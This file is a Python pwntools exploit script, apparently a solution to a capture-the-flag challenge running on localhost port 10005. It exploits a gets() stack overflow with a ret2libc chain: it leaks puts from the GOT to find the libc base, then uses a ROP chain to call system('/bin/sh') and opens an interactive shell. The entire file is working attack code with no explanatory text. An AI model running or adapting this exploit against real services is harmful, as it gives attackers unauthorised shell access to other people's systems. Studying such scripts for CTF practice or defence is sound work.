#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: wintertia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'main_patched')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

host = args.HOST or 'localhost'
port = int(args.PORT or 10005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()
libc = ELF('./libc.so.6')
offset = 40
pop_rdi = 0x000000000040117a
ret = 0x000000000040101a

leak_payload = flat(
    cyclic(offset, n=8),
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    exe.sym['_start']
)
io.sendlineafter(b'gets\n', leak_payload)
puts_leak = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success(f'puts leak: {hex(puts_leak)}')

system = libc.symbols['system'] + puts_leak
binsh = next(libc.search(b'/bin/sh')) + puts_leak

payload = flat(
    cyclic(offset, n=8),
    pop_rdi,
    binsh,
    ret,
    system
)
io.sendlineafter(b'gets\n', payload)

io.interactive()


